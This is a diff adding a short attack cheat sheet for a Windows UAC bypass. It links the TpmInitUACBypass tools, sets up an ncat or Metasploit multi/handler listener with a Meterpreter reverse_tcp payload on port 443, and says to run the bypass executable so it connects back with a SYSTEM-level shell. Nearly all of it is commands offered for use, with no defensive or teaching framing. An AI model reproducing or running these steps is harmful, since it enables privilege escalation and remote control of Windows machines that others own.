@@ -1,0 +1,16 @@
+# first download TpmInitUACBypass
+* Win10 x64 Anniversary Update
+https://github.com/Cn33liz/TpmInitUACAnniversaryBypass
+* Windows 8.1 x64 and Windows 10 x64 (Version 1511)
+https://github.com/Cn33liz/TpmInitUACBypass
+
+# setup a remote Netcat, Ncat or Meterpreter(x64) listener
+ncat -lvp 443
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.1
+set LPORT 443
+exploit -j (see a picture)
+
+# Then open TpmInitUACBypass.exe <Remote Listener IP> <Port> <powershell, cmd or msf> <system>
